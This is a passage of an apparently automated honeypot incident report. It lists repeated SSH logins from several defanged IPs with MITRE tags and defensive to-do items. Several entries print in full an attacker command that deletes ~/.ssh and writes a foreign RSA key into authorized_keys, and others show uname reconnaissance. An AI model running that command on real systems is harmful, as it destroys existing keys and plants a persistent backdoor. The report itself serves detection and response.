| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:03:34` | `cowrie.session.connect` |
| `2026-05-13 08:03:34` | `cowrie.client.version` |
| `2026-05-13 08:03:34` | `cowrie.client.kex` |
| `2026-05-13 08:03:35` | `cowrie.login.success` |
| `2026-05-13 08:03:35` | `cowrie.session.params` |
| `2026-05-13 08:03:35` | `cowrie.command.input` |
| `2026-05-13 08:03:35` | `cowrie.command.failed` |
| `2026-05-13 08:03:35` | `cowrie.log.closed` |
| `2026-05-13 08:03:36` | `cowrie.session.params` |
| `2026-05-13 08:03:36` | `cowrie.command.input` |
| `2026-05-13 08:03:36` | `cowrie.session.file_download` |
| `2026-05-13 08:03:36` | `cowrie.log.closed` |
| `2026-05-13 08:03:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.182.83[.]231` to AbuseIPDB if not already reported
- [ ] Block `5.182.83[.]231` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98c885cc26f0

| Field | Detail |
|---|---|
| **Source IP** | `5.182.83[.]231` |
| **First Seen** | 2026-05-13 08:03 |
| **Last Seen** | 2026-05-13 08:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:03:38` | `cowrie.session.connect` |
| `2026-05-13 08:03:38` | `cowrie.client.version` |
| `2026-05-13 08:03:39` | `cowrie.client.kex` |
| `2026-05-13 08:03:39` | `cowrie.login.success` |
| `2026-05-13 08:03:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.182.83[.]231` to AbuseIPDB if not already reported
- [ ] Block `5.182.83[.]231` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ffbf5906534

| Field | Detail |
|---|---|
| **Source IP** | `223.17.5[.]126` |
| **First Seen** | 2026-05-13 08:04 |
| **Last Seen** | 2026-05-13 08:05 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:04:55` | `cowrie.session.connect` |
| `2026-05-13 08:04:55` | `cowrie.client.version` |
| `2026-05-13 08:04:55` | `cowrie.client.kex` |
| `2026-05-13 08:04:56` | `cowrie.login.success` |
| `2026-05-13 08:04:56` | `cowrie.session.params` |
| `2026-05-13 08:04:56` | `cowrie.command.input` |
| `2026-05-13 08:04:56` | `cowrie.command.failed` |
| `2026-05-13 08:04:56` | `cowrie.log.closed` |
| `2026-05-13 08:04:56` | `cowrie.session.params` |
| `2026-05-13 08:04:56` | `cowrie.command.input` |
| `2026-05-13 08:04:56` | `cowrie.session.file_download` |
| `2026-05-13 08:04:56` | `cowrie.log.closed` |
| `2026-05-13 08:05:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.17.5[.]126` to AbuseIPDB if not already reported
- [ ] Block `223.17.5[.]126` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0b4cc6bd11f

| Field | Detail |
|---|---|
| **Source IP** | `223.17.5[.]126` |
| **First Seen** | 2026-05-13 08:05 |
| **Last Seen** | 2026-05-13 08:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:05:05` | `cowrie.session.connect` |
| `2026-05-13 08:05:05` | `cowrie.client.version` |
| `2026-05-13 08:05:05` | `cowrie.client.kex` |
| `2026-05-13 08:05:05` | `cowrie.login.success` |
| `2026-05-13 08:05:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.17.5[.]126` to AbuseIPDB if not already reported
- [ ] Block `223.17.5[.]126` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0d3d13973c1

| Field | Detail |
|---|---|
| **Source IP** | `221.163.5[.]228` |
| **First Seen** | 2026-05-13 08:05 |
| **Last Seen** | 2026-05-13 08:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:05:23` | `cowrie.session.connect` |
| `2026-05-13 08:05:23` | `cowrie.client.version` |
| `2026-05-13 08:05:23` | `cowrie.client.kex` |
| `2026-05-13 08:05:23` | `cowrie.login.success` |
| `2026-05-13 08:05:24` | `cowrie.session.params` |
| `2026-05-13 08:05:24` | `cowrie.command.input` |
| `2026-05-13 08:05:24` | `cowrie.command.failed` |
| `2026-05-13 08:05:24` | `cowrie.log.closed` |
| `2026-05-13 08:05:24` | `cowrie.session.params` |
| `2026-05-13 08:05:24` | `cowrie.command.input` |
| `2026-05-13 08:05:24` | `cowrie.session.file_download` |
| `2026-05-13 08:05:24` | `cowrie.log.closed` |
| `2026-05-13 08:05:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.163.5[.]228` to AbuseIPDB if not already reported
- [ ] Block `221.163.5[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af87c49ccec3

| Field | Detail |
|---|---|
| **Source IP** | `221.163.5[.]228` |
| **First Seen** | 2026-05-13 08:05 |
| **Last Seen** | 2026-05-13 08:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:05:26` | `cowrie.session.connect` |
| `2026-05-13 08:05:26` | `cowrie.client.version` |
| `2026-05-13 08:05:26` | `cowrie.client.kex` |
| `2026-05-13 08:05:27` | `cowrie.login.success` |
| `2026-05-13 08:05:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.163.5[.]228` to AbuseIPDB if not already reported
- [ ] Block `221.163.5[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5c1d2d2d3de

| Field | Detail |
|---|---|
| **Source IP** | `83.168.69[.]215` |
| **First Seen** | 2026-05-13 08:10 |
| **Last Seen** | 2026-05-13 08:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:10:20` | `cowrie.session.connect` |
| `2026-05-13 08:10:20` | `cowrie.client.version` |
| `2026-05-13 08:10:20` | `cowrie.client.kex` |
| `2026-05-13 08:10:21` | `cowrie.login.success` |
| `2026-05-13 08:10:21` | `cowrie.session.params` |
| `2026-05-13 08:10:21` | `cowrie.command.input` |
| `2026-05-13 08:10:21` | `cowrie.log.closed` |
| `2026-05-13 08:10:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.168.69[.]215` to AbuseIPDB if not already reported
- [ ] Block `83.168.69[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-131b41854dd5

| Field | Detail |
|---|---|
| **Source IP** | `83.168.69[.]215` |
| **First Seen** | 2026-05-13 08:10 |
| **Last Seen** | 2026-05-13 08:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:10:37` | `cowrie.session.connect` |
| `2026-05-13 08:10:37` | `cowrie.client.version` |
| `2026-05-13 08:10:37` | `cowrie.client.kex` |
| `2026-05-13 08:10:37` | `cowrie.login.success` |
| `2026-05-13 08:10:38` | `cowrie.session.params` |
| `2026-05-13 08:10:38` | `cowrie.command.input` |
| `2026-05-13 08:10:38` | `cowrie.log.closed` |
| `2026-05-13 08:10:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.168.69[.]215` to AbuseIPDB if not already reported
- [ ] Block `83.168.69[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b454d5b178f

| Field | Detail |
|---|---|
| **Source IP** | `83.168.69[.]215` |
| **First Seen** | 2026-05-13 08:10 |
| **Last Seen** | 2026-05-13 08:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:10:39` | `cowrie.session.connect` |
| `2026-05-13 08:10:39` | `cowrie.client.version` |
| `2026-05-13 08:10:39` | `cowrie.client.kex` |
| `2026-05-13 08:10:40` | `cowrie.login.success` |
| `2026-05-13 08:10:40` | `cowrie.session.params` |
| `2026-05-13 08:10:40` | `cowrie.command.input` |
| `2026-05-13 08:10:40` | `cowrie.log.closed` |
| `2026-05-13 08:10:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.168.69[.]215` to AbuseIPDB if not already reported
- [ ] Block `83.168.69[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a80ce1292ee5

| Field | Detail |
|---|---|
| **Source IP** | `221.163.5[.]228` |
| **First Seen** | 2026-05-13 08:10 |
| **Last Seen** | 2026-05-13 08:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:10:52` | `cowrie.session.connect` |
| `2026-05-13 08:10:52` | `cowrie.client.version` |
| `2026-05-13 08:10:52` | `cowrie.client.kex` |
| `2026-05-13 08:10:52` | `cowrie.login.success` |
| `2026-05-13 08:10:53` | `cowrie.session.params` |
| `2026-05-13 08:10:53` | `cowrie.command.input` |
| `2026-05-13 08:10:53` | `cowrie.command.failed` |
| `2026-05-13 08:10:53` | `cowrie.log.closed` |
| `2026-05-13 08:10:53` | `cowrie.session.params` |
| `2026-05-13 08:10:53` | `cowrie.command.input` |
| `2026-05-13 08:10:53` | `cowrie.session.file_download` |
| `2026-05-13 08:10:53` | `cowrie.log.closed` |
| `2026-05-13 08:10:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.163.5[.]228` to AbuseIPDB if not already reported
- [ ] Block `221.163.5[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-218cc4c9fc75

| Field | Detail |
|---|---|
| **Source IP** | `221.163.5[.]228` |
| **First Seen** | 2026-05-13 08:10 |
| **Last Seen** | 2026-05-13 08:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:10:56` | `cowrie.session.connect` |
| `2026-05-13 08:10:56` | `cowrie.client.version` |
| `2026-05-13 08:10:56` | `cowrie.client.kex` |
| `2026-05-13 08:10:56` | `cowrie.login.success` |
| `2026-05-13 08:10:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.163.5[.]228` to AbuseIPDB if not already reported
- [ ] Block `221.163.5[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e6a0646cebd

| Field | Detail |
|---|---|
| **Source IP** | `83.168.69[.]215` |
| **First Seen** | 2026-05-13 08:11 |
| **Last Seen** | 2026-05-13 08:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:11:00` | `cowrie.session.connect` |
| `2026-05-13 08:11:00` | `cowrie.client.version` |
| `2026-05-13 08:11:00` | `cowrie.client.kex` |
| `2026-05-13 08:11:00` | `cowrie.login.success` |
| `2026-05-13 08:11:01` | `cowrie.session.params` |
| `2026-05-13 08:11:01` | `cowrie.command.input` |
| `2026-05-13 08:11:01` | `cowrie.log.closed` |
| `2026-05-13 08:11:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.168.69[.]215` to AbuseIPDB if not already reported
- [ ] Block `83.168.69[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6081ad58b7b5

| Field | Detail |
|---|---|
| **Source IP** | `83.168.69[.]215` |
| **First Seen** | 2026-05-13 08:11 |
| **Last Seen** | 2026-05-13 08:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:11:01` | `cowrie.session.connect` |
| `2026-05-13 08:11:01` | `cowrie.client.version` |
| `2026-05-13 08:11:01` | `cowrie.client.kex` |
| `2026-05-13 08:11:02` | `cowrie.login.success` |
| `2026-05-13 08:11:02` | `cowrie.session.params` |
| `2026-05-13 08:11:02` | `cowrie.command.input` |
| `2026-05-13 08:11:02` | `cowrie.log.closed` |
| `2026-05-13 08:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.168.69[.]215` to AbuseIPDB if not already reported
- [ ] Block `83.168.69[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccbd4ff675a1

| Field | Detail |
|---|---|
| **Source IP** | `83.168.69[.]215` |
| **First Seen** | 2026-05-13 08:11 |
| **Last Seen** | 2026-05-13 08:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:11:03` | `cowrie.session.connect` |
| `2026-05-13 08:11:03` | `cowrie.client.version` |
| `2026-05-13 08:11:03` | `cowrie.client.kex` |
| `2026-05-13 08:11:03` | `cowrie.login.success` |
| `2026-05-13 08:11:04` | `cowrie.session.params` |
| `2026-05-13 08:11:04` | `cowrie.command.input` |
| `2026-05-13 08:11:04` | `cowrie.log.closed` |
| `2026-05-13 08:11:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.168.69[.]215` to AbuseIPDB if not already reported
- [ ] Block `83.168.69[.]215` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9481bf938f3d

| Field | Detail |
|---|---|
| **Source IP** | `221.163.5[.]228` |
| **First Seen** | 2026-05-13 08:19 |
| **Last Seen** | 2026-05-13 08:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:19:52` | `cowrie.session.connect` |
| `2026-05-13 08:19:52` | `cowrie.client.version` |
| `2026-05-13 08:19:52` | `cowrie.client.kex` |
| `2026-05-13 08:19:53` | `cowrie.login.success` |
| `2026-05-13 08:19:53` | `cowrie.session.params` |
| `2026-05-13 08:19:53` | `cowrie.command.input` |
| `2026-05-13 08:19:53` | `cowrie.command.failed` |
| `2026-05-13 08:19:53` | `cowrie.log.closed` |
| `2026-05-13 08:19:53` | `cowrie.session.params` |
| `2026-05-13 08:19:53` | `cowrie.command.input` |
| `2026-05-13 08:19:54` | `cowrie.session.file_download` |
| `2026-05-13 08:19:54` | `cowrie.log.closed` |
| `2026-05-13 08:19:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.163.5[.]228` to AbuseIPDB if not already reported
- [ ] Block `221.163.5[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b33f60d56cf0

| Field | Detail |
|---|---|
| **Source IP** | `221.163.5[.]228` |
| **First Seen** | 2026-05-13 08:19 |
| **Last Seen** | 2026-05-13 08:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:19:56` | `cowrie.session.connect` |
| `2026-05-13 08:19:56` | `cowrie.client.version` |
| `2026-05-13 08:19:56` | `cowrie.client.kex` |
| `2026-05-13 08:19:56` | `cowrie.login.success` |
| `2026-05-13 08:19:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.163.5[.]228` to AbuseIPDB if not already reported
- [ ] Block `221.163.5[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b80834ec97ed

| Field | Detail |
|---|---|
| **Source IP** | `221.163.5[.]228` |
| **First Seen** | 2026-05-13 08:23 |
| **Last Seen** | 2026-05-13 08:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:23:34` | `cowrie.session.connect` |
| `2026-05-13 08:23:34` | `cowrie.client.version` |
| `2026-05-13 08:23:34` | `cowrie.client.kex` |
| `2026-05-13 08:23:35` | `cowrie.login.success` |
| `2026-05-13 08:23:35` | `cowrie.session.params` |
| `2026-05-13 08:23:35` | `cowrie.command.input` |
| `2026-05-13 08:23:35` | `cowrie.command.failed` |
| `2026-05-13 08:23:35` | `cowrie.log.closed` |
| `2026-05-13 08:23:35` | `cowrie.session.params` |
| `2026-05-13 08:23:35` | `cowrie.command.input` |
| `2026-05-13 08:23:36` | `cowrie.session.file_download` |
| `2026-05-13 08:23:36` | `cowrie.log.closed` |
| `2026-05-13 08:23:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.163.5[.]228` to AbuseIPDB if not already reported
- [ ] Block `221.163.5[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e38efa3fe498

| Field | Detail |
|---|---|
| **Source IP** | `221.163.5[.]228` |
| **First Seen** | 2026-05-13 08:23 |
| **Last Seen** | 2026-05-13 08:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:23:38` | `cowrie.session.connect` |
| `2026-05-13 08:23:38` | `cowrie.client.version` |
| `2026-05-13 08:23:38` | `cowrie.client.kex` |
| `2026-05-13 08:23:38` | `cowrie.login.success` |
| `2026-05-13 08:23:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.163.5[.]228` to AbuseIPDB if not already reported
- [ ] Block `221.163.5[.]228` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c1340c0f818

| Field | Detail |
|---|---|
| **Source IP** | `221.163.5[.]228` |
| **First Seen** | 2026-05-13 08:28 |
| **Last Seen** | 2026-05-13 08:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 08:28:56` | `cowrie.session.connect` |
| `2026-05-13 08:28:56` | `cowrie.client.version` |
| `2026-05-13 08:28:56` | `cowrie.client.kex` |
| `2026-05-13 08:28:57` | `cowrie.login.success` |
| `2026-05-13 08:28:57` | `cowrie.session.params` |
| `2026-05-13 08:28:57` | `cowrie.command.input` |
| `2026-05-13 08:28:57` | `cowrie.command.failed` |
